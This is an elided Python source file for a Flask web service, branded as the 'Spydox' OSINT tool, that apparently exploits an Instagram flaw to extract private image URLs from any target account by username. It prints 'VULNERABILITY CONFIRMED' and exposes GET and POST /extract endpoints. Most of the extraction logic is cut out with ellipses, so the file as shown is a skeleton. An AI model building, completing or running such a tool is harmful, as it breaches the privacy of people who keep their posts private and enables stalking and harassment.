# =========================================
#  Spydox OSINT Tool - Instagram Private Post Extractor
#  Owner : Spydox
#  Author : Spydox
# =========================================
...
# Direct implementation using the logic from the payload
def extract_instagram_posts(username):
    """Direct implementation of the Instagram extractor using the payload logic"""
    try:
        ...
        image_urls_set = extract_all_image_urls_recursive(timeline_data)
        ...
        # Sort and organize
        image_urls.sort(key=lambda x: (x[0], x[1]))
        posts_count = len(set(url[0] for url in image_urls))
        
        print(f"[+] VULNERABILITY CONFIRMED")
        print(f"[+] Extracted {len(image_urls)} private image URLs from {posts_count} posts")
        ...
        return {
            ...
            "raw_urls": [url for _, _, url in image_urls]  # Simple list of URLs
        }
...
def home():
    return jsonify({
        ...
        "usage": "GET /extract/username or POST to /extract with JSON body {'username': 'target'}"
    })
...
def extract():
    if request.method == 'POST':
        ...
        # GET request with ?username= parameter
